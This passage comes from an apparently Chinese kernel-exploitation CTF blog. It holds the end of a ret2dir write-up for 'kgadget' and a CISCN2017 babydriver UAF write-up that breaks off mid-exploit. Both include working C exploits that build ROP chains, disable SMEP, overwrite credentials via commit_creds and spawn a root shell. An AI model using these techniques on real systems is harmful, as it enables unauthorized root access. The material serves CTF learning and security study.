class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add rsp, offest ; ret<br>add rsp, offest ; ret<br>add rsp, offest ; ret<br>add rsp, offest ; ret<br>.....<br>ret<br>ret<br>.....<br>pop_rdi_ret;<br>init_cred;<br>.....<br></code></pre></td></tr></table></figure><h4 id="3-梳理流程">3.梳理流程</h4><p>我们rdx控制为一个线性映射区的地址，当触发时，执行这个线性映射区的代码，因为我们喷射了很多填满payload的页，所以很大概率是执行填满payload的页里的<code>add rsp, offest ; ret</code>，栈迁移到内核寄存器pt_regs结构里的r9，执行<code>pop rsp;ret</code>，我们r8控制为这个线性映射区的地址，第二次栈迁移到这个线性映射区了，执行<code>add rsp, offest ; ret</code>当做滑板，滑到<code>ret</code>，最后滑到我们的提权链</p><h3 id="0x03exp">0x03exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">size_t</span> page_size=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds=<span class="hljs-number">0xffffffff810c92e0</span>;<span class="hljs-comment">//by set init root get or ida vmlinux</span><br><span class="hljs-type">size_t</span> prepare_kernel_cred=<span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-type">size_t</span> init_cred=<span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-type">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-type">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-type">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-type">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">rop_chain</span><span class="hljs-params">(<span class="hljs-type">size_t</span>* rop)</span><br>&#123;<br>    <span class="hljs-type">int</span> idx=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span>(;idx&lt;(page_size/<span class="hljs-number">8</span><span class="hljs-number">-0x30</span>);idx++)<br>        rop[idx]=<span class="hljs-number">0xffffffff810737fe</span>; <span class="hljs-comment">//add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret</span><br>            <span class="hljs-comment">//more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        <span class="hljs-comment">//rop[idx] = 0xffffffff810001fc ;//ret</span><br>        rop[idx]=<span class="hljs-number">0xffffffff8108c6f1</span>;<br>    <br><br>    rop[idx++] = pop_rdi_ret;<br>    rop[idx++] = init_cred;<br>    rop[idx++] = commit_creds;<br>    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;just_padding&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>&#125;<br><br><span class="hljs-type">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-type">size_t</span> try_hit=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    fd =open(<span class="hljs-string">&quot;/dev/kgadget&quot;</span>,O_RDWR);<span class="hljs-comment">//read &amp; write of file</span><br>    <span class="hljs-keyword">if</span> (fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open /dev/kgadget error!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    page_size=sysconf(_SC_PAGESIZE);<span class="hljs-comment">//Get the current system page size</span><br>    <span class="hljs-comment">//construct per-page rop chain</span><br>    physmap_spray_arr[<span class="hljs-number">0</span>] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    rop_chain(physmap_spray_arr[<span class="hljs-number">0</span>]); <br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spraying physmap...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;<span class="hljs-number">15000</span>;i++)<br>    &#123;<br>        physmap_spray_arr[i] = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (!physmap_spray_arr[i])<br>        &#123;<br>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[X]oom,error exit&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="hljs-number">0</span>], page_size);<br>    &#125;<br>    <br>    try_hit=<span class="hljs-number">0xffff888000000000</span> + <span class="hljs-number">0x7000000</span>;<br>    <span class="hljs-comment">//ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] now trigger...&quot;</span>);<br>    __asm__(<br>    <span class="hljs-string">&quot;mov r15,   0xbeefdead;&quot;</span><br>    <span class="hljs-string">&quot;mov r14,   0x11111111;&quot;</span><br>    <span class="hljs-string">&quot;mov r13,   0x22222222;&quot;</span><br>    <span class="hljs-string">&quot;mov r12,   0x33333333;&quot;</span><br>    <span class="hljs-string">&quot;mov rbp,   0x44444444;&quot;</span><br>    <span class="hljs-string">&quot;mov rbx,   0x55555555;&quot;</span><br>    <span class="hljs-string">&quot;mov r11,   0x66666666;&quot;</span><br>    <span class="hljs-string">&quot;mov r10,   0x77777777;&quot;</span><br>    <span class="hljs-string">&quot;mov r9,    0xffffffff811483d0;&quot;</span>   <span class="hljs-comment">// pop rsp;ret stack migration again</span><br>    <span class="hljs-string">&quot;mov r8,    try_hit;&quot;</span><br>    <span class="hljs-string">&quot;mov rax,   0x10;&quot;</span><br>    <span class="hljs-string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span><br>    <span class="hljs-string">&quot;mov rdx,   try_hit;&quot;</span><br>    <span class="hljs-string">&quot;mov rsi,   0x1bf52;&quot;</span><br>    <span class="hljs-string">&quot;mov rdi,   fd;&quot;</span><br>    <span class="hljs-string">&quot;syscall&quot;</span><br>    ); <br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x04小结">0x04小结</h3><p>按题目的名字来看kgadget，我猜是kernel one_gadget的意思，可以联想到用户态给你这么一个执行指针的漏洞，用户态可以填one_gadget来getshell。在内核态一种方法就是ret2dir，在内核态执行我们在用户态布置的恶意代码，以达到提权等目的。</p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2dir</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0x04 kernel UAF</title>
    <link href="/2022/11/10/0x04kernelUAF/"/>
    <url>/2022/11/10/0x04kernelUAF/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言:</h2><p>本篇是关于kernel UAF，内核中常用分配函数是kmalloc，用的分配器是slub</p><h2 id="CISCN2017-babydriver">CISCN2017 - babydriver</h2><h3 id="0x01程序分析">0x01程序分析</h3><p>解压下cpio,顺便用extract-vmlinux解压bzImage出vmlinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir core<br>cd core<br>mv ../rootfs.cpio rootfs.cpio.gz<br>gunzip ./rootfs.cpio.gz<br>cpio -idm &lt; ./rootfs.cpio<br>cp ./rootfs.cpio ../<br>cd ..<br>chmod +777 extract-vmlinux<br>./extract-vmlinux ./bzImage &gt; vmlinux<br>chmod +777 vmlinux<br><br></code></pre></td></tr></table></figure><h4 id="1-查看init：">1.查看init：</h4><p>可以看到载入了LKM(可加载内核模块)babydriver.ko</p><p>漏洞基本出在这</p><p><img src="/2022/11/10/0x04kernelUAF/2017babydriver1.png" alt="2017babydriver1"></p><h4 id="2-查看保护">2.查看保护</h4><p>无canary，pie</p><p><img src="/2022/11/10/0x04kernelUAF/5.png" alt="5"></p><h4 id="3-ida分析babydriver-ko">3.ida分析babydriver.ko</h4><h5 id="一-两个结构体">一.两个结构体</h5><p>可以看看<a href="https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/#_1">CISCN2017 babydriver(UAF) - b1b1’s share (beafb1b1.github.io)</a>分析的真不错</p><p>ida shift+F9可以找到如下结构</p><p><img src="/2022/11/10/0x04kernelUAF/6.png" alt="6"></p><p>我们点击上图中的XREF，然后ctrl+x查看那个fops的交叉引用</p><p>发现是这个函数</p><p><code>cdev_init(&amp;cdev_0, &amp;fops);</code></p><p>我们点开这个<code>&amp;fops</code></p><p><img src="/2022/11/10/0x04kernelUAF/7.png" alt="7"></p><p>和上图对照可得,（类似于重定向？）</p><blockquote><p>read:babyread</p><p>write:babywrite</p><p>unlocked_ioctl:babyioctl</p><p>open:babyopen</p></blockquote><p><strong>还有另一个结构:{buf,buf_len}</strong></p><p><img src="/2022/11/10/0x04kernelUAF/2.png" alt="2"></p><h5 id="二-一些函数">二.一些函数</h5><p><strong>程序开始，结束会自动进入babydriver_init，babydriver_exit，</strong></p><p><strong>对设备文件使用read或write会调用babyread,babywrite函数</strong></p><p>就是在device_buf指向的内存读写device_buf_len长度</p><p><strong>对设备文件使用open会调用babyopen函数</strong></p><p>open的时候都会通过kmalloc申请一块64字节大小的内存，并把指针存储在bss上的全局变量babydev_struct的device_buf，同时更新babydev_struct的device_buf_len为64。</p><p><img src="/2022/11/10/0x04kernelUAF/3.png" alt="3"></p><p><strong>对设备文件使用ioctl会调用babyioctl函数</strong></p><p>申请一个我们指定长度的内存，并把指针存储在bss上的全局变量babydev_struct的device_buf，同时更新babydev_struct的device_buf_len为我们指定的长度</p><p><img src="/2022/11/10/0x04kernelUAF/4.png" alt="4"></p><h4 id="4-漏洞点">4.漏洞点</h4><p>存在UAF漏洞，babydev_struct是全局变量，我们如果open两次，就是两个指向同一个地址，我们release掉一个，然后这个指针并未置为null，还有一个还在使用，就能uaf了</p><h3 id="0x02解法1：">0x02解法1：</h3><p><strong>大体步骤：UAF+2*stack migitation+bypass-SMEP+ret2usr</strong></p><p>没有开启kalsr，且普通用户能直接读/proc/kallsyms</p><p>但是开启了smep，需要rop关掉它</p><h4 id="1-找gadget">1.找gadget</h4><p>我们先ROPgadget把gadget跑出来</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">time</span> ROPgadget <span class="hljs-comment">--binary ./vmlinux &gt; g2</span><br></code></pre></td></tr></table></figure><p>ROPgadget一下就出来了，ropper跑半天，卡死了</p><p><strong>但是ROPgadget 获得的代码片段中有时候没有iretq和sysretq，我这题就没有，两种解决办法：</strong></p><ol><li>python 进行iretq编码匹配</li><li>ida 解析vmlinux 查找iretq指令</li></ol><p>我这里选择第二种，ida打开vmlinux，alt+t，找iretq</p><p><img src="/2022/11/10/0x04kernelUAF/8.png" alt="8"></p><p>注意<strong>mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</strong>这个指令</p><p>\xc3就是ret的汇编，所以其实这里能执行的话， jmp 0xffffffff8181bf7e相当于ret</p><p><img src="/2022/11/10/0x04kernelUAF/10.png" alt="10"></p><h4 id="2-具体步骤">2.具体步骤</h4><p>open打开<code>/dev/ptmx</code>设备时,就会创建一个 <code>tty_struct</code> 结构体，这个<code>tty_struct</code> 结构体里存放着tty_operations指针，</p><blockquote><p>那么我们不难想到的是我们可以通过 UAF 劫持 <code>/dev/ptmx</code> 这个设备的 <code>tty_struct</code> 结构体与其内部的 <code>tty_operations</code> 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p></blockquote><p>就是当使用write函数时，会调用tty_struct的tty_operations里的write指针</p><p>(tty_operations在tty_struct的下标3处)</p><p>(对应write的指针在tty_operations下标7处)</p><p>因为显然没og这种一个地址达成目标，所以要迁移到栈上</p><p>在调用<code>tty_operations-&gt;write</code>时，<strong>其rax寄存器中存放的便是tty_operations结构体的地址</strong>，因此若是我们能够在内核中找到形如<code>mov rsp, rax</code>的gadget，便能够成功地将栈迁移到<code>tty_operations</code>结构体的开头</p><p>所以第一次迁移rsp就是利用 程序运行到那时rax保存的fake_operations开头地址</p><p>我们用pop rax在fake_operations开头布置好rax为rop链的地址，第二次迁移rsp到rop链，就能执行我们的rop链了</p><p>rop链的内容是(关闭smep-&gt;ret2usr-&gt;内核态get_root-&gt;生成shell-&gt;着陆回用户态)</p><h4 id="3-exp">3.exp</h4><p>值得注意的是遍历符号表会找到好几个commit_creds和prepare_kernel_cred_addr，我们找到这两个直接退出遍历即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc new_exp.c -static -masm=intel -g -o new_exp</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /proc/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(commit_creds_addr&amp;&amp;prepare_kernel_cred_addr)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds_addr;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-comment">//sleep(10);</span><br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">13</span>],p=<span class="hljs-number">0</span>;<br>    rop[p++]= <span class="hljs-number">0xffffffff810d238d</span>; <span class="hljs-comment">//pop rdi ; ret</span><br>    rop[p++]= <span class="hljs-number">0x6f0</span>;<br>    rop[p++]= <span class="hljs-number">0xffffffff81004d80</span>; <span class="hljs-comment">//mov cr4, rdi ; pop rbp ; ret</span><br>    rop[p++]= <span class="hljs-number">0</span>;<br>    rop[p++]= getRootPrivilige;<br>    rop[p++]= <span class="hljs-number">0xffffffff81063694</span>; <span class="hljs-comment">//swapgs ; pop rbp ; ret</span><br>    rop[p++]= <span class="hljs-number">0</span>; <br>    rop[p++]= <span class="hljs-number">0xFFFFFFFF8181A797</span>;<span class="hljs-comment">//iretq ;ret</span><br>    rop[p++]= spawn_shell;<span class="hljs-comment">//rip</span><br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br><span class="hljs-type">size_t</span> fake_op[<span class="hljs-number">0x10</span>];<br>fake_op[<span class="hljs-number">0</span>]=<span class="hljs-number">0xffffffff8100ce6e</span>; <span class="hljs-comment">// pop rax ; ret</span><br>fake_op[<span class="hljs-number">1</span>]=rop;<br>fake_op[<span class="hljs-number">2</span>]=<span class="hljs-number">0xffffffff8181bfc5</span>; <span class="hljs-comment">//mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e</span><br>fake_op[<span class="hljs-number">7</span>]=<span 